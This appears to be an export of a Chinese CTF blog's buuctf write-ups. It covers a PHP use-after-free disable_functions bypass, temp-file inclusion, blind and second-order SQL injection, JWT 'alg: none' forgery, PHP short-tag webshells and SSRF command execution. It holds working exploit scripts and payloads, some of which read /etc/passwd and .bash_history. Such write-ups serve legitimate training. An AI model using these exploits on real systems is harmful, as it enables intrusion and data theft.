{\n        die(\"UAF failed\");\n    }\n\n    # leaks\n    $closure_handlers = str2ptr($abc, 0);\n    $php_heap = str2ptr($abc, 0x58);\n    $abc_addr = $php_heap - 0xc8;\n\n    # fake value\n    write($abc, 0x60, 2);\n    write($abc, 0x70, 6);\n\n    # fake reference\n    write($abc, 0x10, $abc_addr + 0x60);\n    write($abc, 0x18, 0xa);\n\n    $closure_obj = str2ptr($abc, 0x20);\n\n    $binary_leak = leak($closure_handlers, 8);\n    if(!($base = get_binary_base($binary_leak))) {\n        die(\"Couldn't determine binary base address\");\n    }\n\n    if(!($elf = parse_elf($base))) {\n        die(\"Couldn't parse ELF header\");\n    }\n\n    if(!($basic_funcs = get_basic_funcs($base, $elf))) {\n        die(\"Couldn't get basic_functions address\");\n    }\n\n    if(!($zif_system = get_system($basic_funcs))) {\n        die(\"Couldn't get zif_system address\");\n    }\n\n    # fake closure object\n    $fake_obj_offset = 0xd0;\n    for($i = 0; $i < 0x110; $i += 8) {\n        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));\n    }\n\n    # pwn\n    write($abc, 0x20, $abc_addr + $fake_obj_offset);\n    write($abc, 0xd0 + 0x38, 1, 4); # internal func type\n    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler\n\n    ($helper->b)($cmd);\n\n    exit();\n}\n```\n\n将这个脚本上传上去 这里最好是到 /var/tmp  或者 /tmp 这两个路径是用户用于存储临时性的文件，亦经常被程序读写用户存储临时性数据，本质上没区别，既然是用户存储临时性数据，我们一般是有写文件权限的。 \n\n可以在我的centos7上看看\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681051771351-a93986bf-01f1-43c9-a09d-e42c37133783.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681051825293-1ea88dd7-710f-4876-9de0-95c867ad2022.png)\n\n可以看到这两种路径的默认权限是777\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681051303740-0e86adff-6bd1-4558-a103-ad3614348457.png)\n\n上传成功 之后再去包含他\n\n成功~\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681051469402-699b9232-eb82-451c-8e15-007bc3886685.png)\n","tags":["bypass","thinkphp"],"categories":["buuctf"]},{"title":"buuctf-91-[NPUCTF2020]ezinclude","url":"/post/da0771e5.html","content":"\n[NPUCTF2020]ezinclude\n\n<!--more-->\n\n一道php文件临时包含的题目，之前没见过\n\n进入之后 根据提示 给pass传一个hash值 可以抓包看到\n\n然后直接在bp里操作就行，不然网页会挑战到一个404网页\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681137425602-9e43ff11-ea0a-4d35-9bc4-e4b30806e036.png)\n\n存在文件包含\n\n一般这种flag文件名称会被改写成奇奇怪怪的形式，靠猜是猜不到的\n\n读一下当前页面的源码吧 用一下伪协议\n\n构造payload：`?file=php://filter/read=convert.base64-encode/resource=flflflflag.php`\n\n发现data input zip协议都被河蟹了 没办法直接命令执行\n\n源码如下\n\n```python\n<html>\n<head>\n<script language=\"javascript\" type=\"text/javascript\">\n           window.location.href=\"404.html\";\n</script>\n<title>this_is_not_fl4g_and_出题人_wants_girlfriend</title>\n</head>\n<>\n<body>\n<?php\n$file=$_GET['file'];\nif(preg_match('/data|input|zip/is',$file)){\n\tdie('nonono');\n}\n@include($file);\necho 'include($_GET[\"file\"])';\n?>\n</body>\n</html>\n```\n\n扫一下网站 发现还有config.php 里面是假的flag 还有一个dir.php\n\n内容如下：\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681137766612-8b1fa82f-df6a-4aa0-89e5-d0945ac1bf4f.png)\n\n发现这个文件可以帮我们扫/tmp的文件目录 这个目录是存储用户临时文件的地方 我们对他有写权限 \n\n这里用到了 php临时文件包含的漏洞 具体参考（https://www.anquanke.com/post/id/201136#h2-11）\n\nphp7.0的bug：\n\n```\n?file=php://filter/string.strip_tags/resource=/etc/passwd\n```\n\n使用`php://filter/string.strip_tags`导致php崩溃清空堆栈重启，如果在同时上传了一个文件，那么这个tmp file就会一直留在tmp目录，再进行文件名爆破就可以getshell,这个崩溃原因是存在一处空指针引用。\n\n该方法仅适用于以下php7版本，php5并不存在该崩溃。\n\n• php7.0.0-7.1.2可以利用， 7.1.2x版本的已被修复  \n\n• php7.1.3-7.2.1可以利用， 7.2.1x版本的已被修复 \n\n• php7.2.2-7.2.8可以利用， 7.2.9一直到7.3到现在的版本已被修复\n\n利用大佬现成的脚本\n\n```python\nimport requests\nfrom io import BytesIO\nurl=\"http://5fd4afee-539c-424e-9b53-31cc89bbddf7.node4.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd\"\npayload=\"<?php phpinfo();?>\"\nfiles={\n    \"file\":BytesIO(payload.encode())\n}\nr=requests.post(url=url,files=files,allow_redirects=False)\n\n\nprint(r.text)\n```\n\n之后再去看看dir.php\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681137989466-9f670370-e4b0-47fe-a73d-978c28304509.png)\n\n发现我们的恶意文件已经被上传\n\n再去包含一下我们的文件\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681138061207-03a37f3f-f1cd-4103-9530-a59e235d7fe0.png)\n","tags":["php临时文件包含"],"categories":["buuctf"]},{"title":"buuctf-90-[NCTF2019]SQLi","url":"/post/4f5e876.html","content":"\n[NCTF2019]SQLi\n\n<!--more-->\n\nsql注入 fuzz一下发现屏蔽了很多的sql常用命令\n\n扫服务器后台发现hint.txt\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681030820273-63312165-e4dd-489c-8d16-4d6a50608be8.png)\n\n也就是当我们获得admin的密码时，就能获得flag，连admin都被黑名单了，显然是不想让我们通过常用的手段去注入\n\n回到主页看到他已经给了我们系统的查询语句\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681030986280-e33b949b-5625-4741-be44-78bb74245b06.png)\n\n这里是不是就能想到通过巧妙的闭合改变查询语句使得我们的恶意注入语句就能被调用\n\n看了大佬的wp发现是正则注入 regexp\n\n本地测试\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681031145077-b7064c79-5562-4128-994e-bb74b5ef25a1.png)\n\n能看出无论username的内容是否在这个表单中，因为有`||`（相当于逻辑或）\n\n当`password=\"^1\"`也就是以1开头 之后以12开头，利用这样的正则匹配去一位一位的试探，思路类似于布尔盲注，根据回显来判断。\n\n回到题目，应该怎么构造呢\n\n题目sql里的查询语句为：\n\n```\nselect * from users where username='' and passwd=''\n```\n\n可以构造`username=\\&passwd=||sql;%00`  空格被河蟹了可以用`/**/`绕过  注释符`# --`\n\n`%00`来绕过本质上是截断 这里末尾的封号实际上是sql语句里的\n\n因为很多程序底层都是c语言编译的，c语言对于一个字符串到末尾的标识是是否检测到`\\0`经过url加密后即为`%00`\n\n放入原语句后为：`select * from users where username='\\' and passwd='||sql;%00'`\n\n相当于username中的语句为`' and passwd =`内容不重要 然后逻辑或 加上我们的sql注入的恶意语句\n\n```\nusername=\\&passwd=||/**/passwd/**/regexp/**/\"^{}\";%00\n```\n\n如果回显正常为会定向到welcome.php\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681033291490-4106c873-7f0f-4dc4-930a-176e216861db.png)\n\n根据思路写出脚本\n\n```python\nimport requests\nfrom urllib import parse\nimport string\nurl = 'http://16b0c2ee-be28-47f4-8454-b6a04a23aa8f.node4.buuoj.cn:81/index.php'\nresult = ''\ndictionary = string.ascii_lowercase + string.digits + '_' #爆破字典\nfor i in range (1,35):\n    for j in dictionary:\n        payload = {\n            \"username\":\"\\\\\",   #这里需要转义一下\n            \"passwd\":\"||/**/passwd/**/regexp/**/\\\"^{}\\\";{}\".format((result+j),parse.unquote(\"%00\"))\n        }\n        r = requests.post(url,data=payload)\n        if \"welcome\" in r.text:\n            result+=j\n            break\n    print(result)\n```\n\n这里注意一下：如果在登录框里面敲%00 那样会导致%00被转义而失去作用 在python脚本里面 我们用parse.unquote('%00')表示不进行转义的%00 这样就能爆出密码  \n","tags":["sql注入","sql bypass","sql正则注入"],"categories":["buuctf"]},{"title":"buuctf-88-[网鼎杯 2018]Comment","url":"/post/3a0e9ae9.html","content":"\n[网鼎杯 2018]Comment\n\n<!--more-->\n\n这是一道关于sql二次注入的题目 第一次遇到二次注入的题目蛮不错\n\n进入之后，是一个类似于留言板的界面\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681456616603-81a091fd-c756-4579-9d71-8352ed648e24.png)\n\n需要先登录 然后形式是密码最后三位纯数字不知道 通过bp爆破一下就出来了 密码结尾是666\n\n进入之后f12\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681456702395-d52c4662-22f7-4655-af63-fa9d6fc43792.png)\n\n发现提示 存在git源码泄露的\n\n直接上githack\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681456816678-f2f3e1ca-7c33-420e-ba91-40677e6f3b1c.png)\n\n发现源码\n\n```plain\n<?php\ninclude \"mysql.php\";\nsession_start();\nif($_SESSION['login'] != 'yes'){\n    header(\"Location: ./login.php\");\n    die();\n}\nif(isset($_GET['do'])){\nswitch ($_GET['do'])\n{\ncase 'write':\n    break;\ncase 'comment':\n    break;\ndefault:\n    header(\"Location: ./index.php\");\n}\n}\nelse{\n    header(\"Location: ./index.php\");\n}\n?>\n```\n\n但是发现源码不全 \n\n用`git log`或者 `git log --reflog`找到原来的代码然后恢复\n\n但是我这里没有复现成功 一直报错 找了好久没发现是什么原因\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681457000040-68cd4018-9ec3-40a8-b762-b9cc760e35b5.png)\n\n无果只能再去寻找别的方法\n\n然后发现了另一个 提取远程 git 泄露或本地 git 的工具   git_extract  可以说是增强版 \n\n源码地址：https://github.com/gakki429/Git_Extract\n\n调用的时候 要用python2 因为这是python2的脚本\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681457176398-212a1e06-efb1-4962-a7ca-4eeb2f93d696.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681457212657-afd10c8f-9d96-48ce-8e53-9ce1e4516f90.png)\n\n发现了更早的源码\n\n```plain\n<?php\ninclude \"mysql.php\";\nsession_start();\nif($_SESSION['login'] != 'yes'){\n    header(\"Location: ./login.php\");\n    die();\n}\nif(isset($_GET['do'])){\nswitch ($_GET['do'])\n{\ncase 'write':\n    $category = addslashes($_POST['category']);\n    $title = addslashes($_POST['title']);\n    $content = addslashes($_POST['content']);\n    $sql = \"insert into board\n            set category = '$category',\n                title = '$title',\n                content = '$content'\";\n    $result = mysql_query($sql);\n    header(\"Location: ./index.php\");\n    break;\ncase 'comment':\n    $bo_id = addslashes($_POST['bo_id']);\n    $sql = \"select category from board where id='$bo_id'\";\n    $result = mysql_query($sql);\n    $num = mysql_num_rows($result);\n    if($num>0){\n    $category = mysql_fetch_array($result)['category'];\n    $content = addslashes($_POST['content']);\n    $sql = \"insert into comment\n            set category = '$category',\n                content = '$content',\n                bo_id = '$bo_id'\";\n    $result = mysql_query($sql);\n    }\n    header(\"Location: ./comment.php?id=$bo_id\");\n    break;\ndefault:\n    header(\"Location: ./index.php\");\n}\n}\nelse{\n    header(\"Location: ./index.php\");\n}\n?>\n```\n\n分析：\n\n存在两个表 board 和 commet\n\n并且  `$sql = \"select category from board where id='$bo_id'\";`当我们评论时候还会调用board表\n\n再来看\n\n```plain\n $sql = \"insert into comment\n            set category = '$category',\n                content = '$content',\n                bo_id = '$bo_id'\";\n```\n\n $category,$content是我们可控的。且最后显示的是content，我们可以尝试闭合content = '$content'\n\n举例当我们去发帖语句为\n\n category 为`',content=user(),/*`其它随意，然后去详情里面评论`*/#` 这样就会回显我们当前用户信息 \n\n 然后语句会被拼接成下面这样\n\n```plain\ninsert into comment\n       set category = ' ',content=user()，/*',\n           content = '*/#',\n           bo_id = '$bo_id'\";\n```\n\n即原来的content内容被我们用注释`/**/`给注释了 我们自己可以创建一个content从而达到我们想要的语句\n\n构造payload:`',content=user(),/*`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681457876263-11247f01-8e8e-4d7d-bc18-9f12b9db735c.png)\n\n发现是root权限 这可太行了\n\n直接用load_file()函数去读文件\n\n构造payload:`123',content=((select(load_file(\"/etc/passwd\")))),/*`\n\n```\ncategory=123',content=((select(load_file(\"/etc/passwd\")))),/*` 注意一下这里category里面最好随便放点内容 如果直接是空的 比如构造成这样`',content=((select(load_file(\"/etc/passwd\")))),/*\n```\n\n闭合进去之后就会变成`category=''`直接为空字符 可能会无回显\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681458181723-73e833f2-d821-432c-9068-e596e2fdc3f6.png)\n\n发现成功读取\n\n看到最后一行 发现存在www用户 那么这是什么呢 一般我们在linux下安装web开设靶场 一般默认系统web用户会为www\n\n一般增加的用户信息会在/home路径下 root本身的信息会在根目录/root路径里\n\n比如我曾经在我的centos7上装过小皮面板 就会有个www用户默认在我的/home路径下（那个apple用户是我当时创建的用户 ）\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681459107727-6f72a691-4d4d-4bfb-978b-ec74ff3871b8.png)\n\n并且能看到地址目录为：/home/www\n\n构造payload:`123',content=((select(load_file(\"/home/www/.bash_history\")))),/*`\n\n这里.bash_history文件是什么呢 一般在linux 以`.`开头的都是隐藏文件\n\n**在终端敲过的命令，linux是有记录的，默认可以记录500条历史命令。这些命令保存在用户的宿主目录中的.bash_history文件中。**\n\n拿我本地apple用户来说，如下\n\n我曾经修改过apple用户的密码 所以有记录\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681475557865-59d282b4-768a-4e0d-b4d2-4723531214e1.png)\n\n回到题目得到\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681475942695-14971e8c-c568-4952-af18-e563d06b2d01.png)\n\n看到记录有依次如下操作：\n\n1. `cd /tmp`\n2. `unzip html.zip`\n3. `rm -f html.zip`\n4. `cp -r html /var/www/`\n5. `cd /var/www/html/`\n6. `rm -f .DS_Store`\n7. `service apache2`\n\n他只删除了在/var/www/html下的 .DS_Store文件 原来路径下的.DS_Store文件还保存着 我们可以读取，并且里面内容读出来大多数是乱码 最好以hex()函数也就是16进制读出来\n\n .DS_Store(英文全称 Desktop Services Store)是一种由苹果公司的Mac OS X操作系统所创造的隐藏文件，目的在于存贮目录的自定义属性，例如文件们的图标位置或者是背景色的选择。相当于 Windows 下的 desktop.ini。  \n\n构造payload：`test',content=((select(hex(load_file(\"/tmp/html/.DS_Store\"))))),/*`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681476511756-e8b75674-d60e-4d5d-a7ce-31cf1e5ab0bf.png)\n\n发现了flag文件名  flag_8946e1ff1ee3e40f.php\n\n然后去读取 构造payload：`test',content=((select(hex(load_file(\"/var/www/html/flag_8946e1ff1ee3e40f.php\"))))),/*`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681477444236-e9e3cfb8-9317-4232-8d52-18308f23d7fd.png)\n\n转码得到flag\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681477495066-73d43d91-f33b-43a7-b0cf-182e906dd900.png)\n","tags":["sql注入","源码泄露"],"categories":["buuctf"]},{"title":"buuctf-86-[GYCTF2020]Ezsqli","url":"/post/d359692.html","content":"\n[GYCTF2020]Ezsqli\n\n<!--more-->\n\n一眼丁真，鉴定为sql盲注。\n\n## 爆库：\n\n```python\nimport requests #调requests模块\nimport time\nurl = 'http://b5c5750a-2950-4463-bba1-7eb101bc3c20.node4.buuoj.cn:81/'  \n#payload = {\"id\":\"0^(ascii(substr((select database()),1,1))>97)\"}\ndatabase = ''\nfor i in range (1,25):\n    for j in range(31,128):\n        payload = {\"id\":\"0^(ascii(substr((select database()),{},1))={})\".format(i,j)}\n        r = requests.post(url,data=payload)\n        time.sleep(0.005)\n        if 'Nu1L' in r.text:\n            database+=chr(j)\n            print(database)\n            continue\n        else:\n            pass\n# 爆库 give_grandpa_pa_pa_pa\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680942404461-ef13c20a-2bb9-45ae-8ff3-c0427fb9144b.png)\n\n库没用其实，之后可以用database()代替 而且and也是被河蟹了 give_grandpa_pa_pa_pa  库名用不了的\n\n## 爆表：\n\n因为or被河蟹\n\n所以不能用`information_schema`来查询 用`sys.x$schema_flattened_keys`来代替\n\n参考：https://nosec.org/home/detail/3830.html\n\n```python\nimport requests #调requests模块\nimport time\nurl = 'http://b5c5750a-2950-4463-bba1-7eb101bc3c20.node4.buuoj.cn:81/'  \n#payload = {\"id\":\"0^ascii(substr((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema=database()),1,1))<103\"}\ntables = ''\nfor i in range (1,50):\n    for j in range(31,12):\n        payload = {\"id\":\"0^(ascii(substr((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema=database()),{},1))={})\".format(i,j)}\n        r = requests.post(url,data=payload)\n        time.sleep(0.005)\n        if 'Nu1L' in r.text:\n            tables+=chr(j)\n            print(tables)\n            continue\n        else:\n            pass\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680945616193-69eecadc-cb2f-454e-b445-ddf0fae6ee7d.png)\n\n使用二分法改进后：\n\n```python\nimport requests #调requests模块\nimport time\nurl = 'http://b5c5750a-2950-4463-bba1-7eb101bc3c20.node4.buuoj.cn:81/'  \ntables = \"\"\nfor i in range (1,50):\n    low=31\n    high=127\n    mid = (low+high)//2\n    while low<=high:\n        payload = {\"id\":\"0^(ascii(substr((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema=database()),{},1))>{})\".format(i,mid)}\n        r = requests.post(url,data=payload)\n        if(\"Nu1L\" in r.text):\n            low=mid+1\n            mid = (low+high)//2\n        else:\n            high=mid-1\n            mid = (low+high)//2\n    tables+=chr(high+1)\n    print(tables)\n    time.sleep(0.3)\n```\n\n## 爆flag\n\n这里用到了列比较去试flag\n\n![image.png](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1682765495231-e76b1bfa-890e-434c-ac6e-8b375375bddf.png)\n\n`0^((1,'{0}')>(select * from f1ag_1s_h3r3_hhhhh))` 这里的 1是猜测第一列一般为索引id 1，因此在这里用1，之后就是去慢慢写脚本去试字符，这里写脚本的时候要加上之前已经爆出的字符慢慢去比较。\n\n\n\n```python\nimport requests #调requests模块\nimport time\nurl = 'http://b5c5750a-2950-4463-bba1-7eb101bc3c20.node4.buuoj.cn:81/'  \nflag = \"\"\nfor i in range (1,50):\n    low=31\n    high=127\n    mid = (low+high)//2\n    while low<=high:\n        flag_1 = flag + chr(mid)\n        payload = {\"id\":\"0^((1,'{0}')>(select * from f1ag_1s_h3r3_hhhhh))\".format(flag_1)}\n        r = requests.post(url,data=payload)\n        if(\"Nu1L\" in r.text):\n            high=mid-1\n            mid = (low+high)//2\n        else:\n            low=mid+1\n            mid = (low+high)//2\n    print(flag,chr(high))\n    flag+=chr(high)\n    time.sleep(2)\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1680960278657-402336f5-111f-495a-982c-872e948175e1.png)\n","tags":["sql注入","sql bypass"],"categories":["buuctf"]},{"title":"buuctf-85-[HFCTF2020]EasyLogin","url":"/post/a8c0011c.html","content":"\n[HFCTF2020]EasyLogin\n\n<!--more-->\n\n一道关于jwt认证的题目 之前有做过相同的题目\n\n申请一个账号登录  然后就是一个获取flag的输入框 但是我们普通身份肯定是获取不到的\n\n这里我试了试申请admin账号发现不行 做到这里估计是后面大概率是要伪造身份为admin然后getflag\n\n查看源码发现是用koa框架\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681961292803-2507d542-7b9c-4425-9228-4b0c8129a613.png)\n\n然后看了一下别人的wp这个框架是用jwt鉴权的\n\n关于鉴权可以看这篇文章https://juejin.cn/post/7003147063542153224\n\n登录抓包\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681961802245-b79f5a21-698c-4857-8b2c-d169a365a871.png)\n\n将其放入https://jwt.io/ 自动帮我们生成相关信息\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681961865878-e174b300-c12c-44a4-bd80-b9f0908ae748.png)\n\nJWT(json web token)的三个部分依次如下：（参考：http://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html）\n\n- Header（头部）\n- Payload（负载）\n- Signature（签名）\n\n比如：`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzZWNyZXRpZCI6MSwidXNlcm5hbWUiOiIxMjMiLCJwYXNzd29yZCI6IjEyMyIsImlhdCI6MTY4MTk1OTg3N30.jJv8tD-ULxBStlglQIsVQgnR-nC7hbxsPJqOQiF_qJg`\n\n三部分之间用`.`间隔\n\n这里这里绕过需要将alg（算法）改为none 将secretid改为[]\n\n因为这个网站无法成none后的jwt编码 所以只能手动生成 也就是每部分base64编码 然后再用`.`连接\n\n因为算法已经是none了所以不需要第三段签名了\n\n```\n{\"alg\": \"none\",\"typ\": \"JWT\"}\neyJhbGciOiAibm9uZSIsInR5cCI6ICJKV1QifQ==\n{\"secretid\": [],\"username\": \"admin\",\"password\": \"123\",\"iat\": 1681959877}\neyJzZWNyZXRpZCI6IFtdLCJ1c2VybmFtZSI6ICJhZG1pbiIsInBhc3N3b3JkIjogIjEyMyIsImlhdCI6IDE2ODE5NTk4Nzd9\n```\n\n`eyJhbGciOiAibm9uZSIsInR5cCI6ICJKV1QifQ.eyJzZWNyZXRpZCI6IFtdLCJ1c2VybmFtZSI6ICJhZG1pbiIsInBhc3N3b3JkIjogIjEyMyIsImlhdCI6IDE2ODE5NTk4Nzd9.`注意这里虽然签名部分被省略了 但是最后一个`.`要加上 并且签名中base64编码中用来补位`==`要删除\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681962341963-9db7cc75-363b-4962-a3e9-305804f318ad.png)\n\n成功以admin身份登入\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681962377789-ed8fda04-f829-4128-b346-0eaa7fd13958.png)\n\n获取flag即可\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1681962413236-6f1c0fae-a99c-4e2c-bb3b-b1eddb193dfd.png)\n\n其实这道题还是前期信息检索去明白他框架是jwt鉴权\n","tags":["jwt"],"categories":["buuctf"]},{"title":"buuctf-79-[红明谷CTF 2021]write_shell","url":"/post/51b0b22f.html","content":"\n[红明谷CTF 2021]write_shell\n\n<!--more-->\n\n## 碎碎念：\n\n这道题目还是蛮简单的，考了php短标签和空格绕过，还有一个双问号表达式\n\n## 解题：\n\n放出源码\n\n```plain\n<?php\nerror_reporting(0);\nhighlight_file(__FILE__);\nfunction check($input){\n    if(preg_match(\"/'| |_|php|;|~|\\\\^|\\\\+|eval|{|}/i\",$input)){\n        // if(preg_match(\"/'| |_|=|php/\",$input)){\n        die('hacker!!!');\n    }else{\n        return $input;\n    }\n}\n\nfunction waf($input){\n  if(is_array($input)){\n      foreach($input as $key=>$output){\n          $input[$key] = waf($output);\n      }\n  }else{\n      $input = check($input);\n  }\n}\n\n$dir = 'sandbox/' . md5($_SERVER['REMOTE_ADDR']) . '/';\nif(!file_exists($dir)){\n    mkdir($dir);\n}\nswitch($_GET[\"action\"] ?? \"\") {\n    case 'pwd':\n        echo $dir;\n        break;\n    case 'upload':\n        $data = $_GET[\"data\"] ?? \"\";\n        waf($data);\n        file_put_contents(\"$dir\" . \"index.php\", $data);\n}\n?>\n```\n\n首先就是通过你的`sandbox+md5(ip)`创建一个沙盒路径 老套路了\n\n然后这里有两个问号`??`先来看看\n\n这种是比较运算符中的NULL 合并操作符,从PHP7开始提供,作用是:从左往右第一个存在且不为 NULL 的操作数。如果都没有定义且不为 NULL，则返回 NULL  \n\n就是如果c= a??b 如果a为0 则c=b 如果a不为0 则c=a\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679661478990-0980b9d2-889c-49ef-a790-becc223c2860.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679661494898-f5c96b64-3163-4984-9ebb-6d5cfd802007.png)\n\n然后就是有两个模式 一个pwd就是返回路径的 upload模式让我提交shell的但是提交前会通过一个筛选\n\n过滤了`\"/'| |_|php|;|~|\\\\^|\\\\+|eval|{|}/i\"` `php eval {} ` 空格都被禁了\n\n如果直接构造`?data=ls%09/`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679661798378-610250da-1970-4ea0-92aa-8712ea9df795.png)\n\n则只会显示 不会执行 那么我们需要构造php代码去执行我们的linux命令 这也印证了前面为什么要禁php字样了\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679661956409-64ad7724-461e-4519-adb7-e66b1a2ea3e7.png)\n\n但是php字样被禁 所以要用短标签了 下面二选一\n\n```\n<?echo%09`ls%09/`?>\n<?=`ls%09/`?>\n```\n\n这里绕过空格 不能用`$IFS$9` 估计是因为php会把这个`$`当作变量来解析吧 用%09绕过就行\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679662047463-b38f3a26-75d5-4987-b03b-70f5bd8d9244.png)\n\n然后cat读出来就行了\n","tags":["bypass","php短标签"],"categories":["buuctf"]},{"title":"buuctf-82-[HITCON 2017]SSRFme","url":"/post/8253ed9f.html","content":"\n[HITCON 2017]SSRFme\n\n<!--more-->\n\n## 碎碎念：\n\n这是一道ssrf 也就是服务器端请求伪造的题目 发现这样的题目常常会有 $_SERVER数组的应用，还是蛮不错的qwq\n\n## 解题：\n\n进入题目给出源码：\n\n```plain\n10.244.80.206 <?php\n    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {\n        $http_x_headers = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);\n        $_SERVER['REMOTE_ADDR'] = $http_x_headers[0];\n    }\n\n    echo $_SERVER[\"REMOTE_ADDR\"];\n\n    $sandbox = \"sandbox/\" . md5(\"orange\" . $_SERVER[\"REMOTE_ADDR\"]);\n    @mkdir($sandbox);\n    @chdir($sandbox);\n\n    $data = shell_exec(\"GET \" . escapeshellarg($_GET[\"url\"]));\n    $info = pathinfo($_GET[\"filename\"]);\n    $dir  = str_replace(\".\", \"\", basename($info[\"dirname\"]));\n    @mkdir($dir);\n    @chdir($dir);\n    @file_put_contents(basename($info[\"basename\"]), $data);\n    highlight_file(__FILE__);\n```\n\n首先第一部分if作用就是获取我们的ip\n\n然后第二部分 根据我们的ip创建一个由md5加密的沙盒 然后选择它\n\n第三部分 `shell_exec` 执行我们的 get到的 `GET+url`的命令\n\n这里用到了linux中 GET命令 \n\n GET 这个命令的一个命令执行漏洞，主要是 perl 的一个特点，在 open 可以执行命令并且还支持file协议。  \n\n**注意：file 协议利用 open 命令执行,要执行的命令先前必须要有以命令为文件名的文件存在**\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679655020115-9c486f4f-405b-44fe-93c6-564e21e45ae2.png)\n\n这里以命令为文件名的文件必须加上管道符`|` 否则不行,不太明白这里为什么不加就不行\n\npathinfo — 返回文件路径的信息\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679654422668-fd2e7ba0-b67a-4c25-801b-efb66dd197e1.png)\n\n也就是创建一个我们传入filename的文件 然后选择它\n\nfile_put_contents — 将数据写入文件 \n\n这里也就是把$data的内容写入 我们的filename的文件中\n\n构造payload：`?url=file:ls /|&filename=ls /|`  这里要执行两次才能成功 也就是提交两次  为什么要提交两次呢\n\n因为前面说过 file 协议利用 open 命令执行,要执行的命令先前必须要有以命令为文件名的文件存在 \n\n然后这里为什么要加反斜杠呢 因为管道符需要我们去转义一下\n\n因此第一次提交 是让去创建一个以命令为文件的文件  第二次才去执行并且将执行结果写入到文件中去\n\n然后再根据我们的ip 去构造沙盒路径\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679655416854-884aeaf3-67e1-4957-8fec-aecb1fef681e.png)\n\n构造payload访问：`/sandbox/2eeed2f9aeae6311b507ada8fb98809e/ls \\|`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1679655471087-d0091932-4b56-4371-bdb7-0912c0535f48.png)\n\n看到有个readflag 理论来说直接执行`./readflag`就可以了 但是这里不行 我们要通过构造一个以命令为文件名的文件然后去访问 如果这里构造：`/readflag`文件是执行不了的 因为这里必须是`/readflag|` 才能成功执行 但是readflag| 不是readflag文件就算执行了也没用\n\n再说一句 一般见到readflag这样的文件名字 直接去执行 而不是去通过cat这样的命令去读 因为readflag里面是代码 直接`./`执行就行了\n\n构造：`?url=file:bash -c /readflag|&filename=bash -c /readflag|` 也是和上面一样执行两次然后通过路径去访问就可以拿到flag了\n\n这里用的`bash -c` 也就是将后面字符串当作命令读入执行 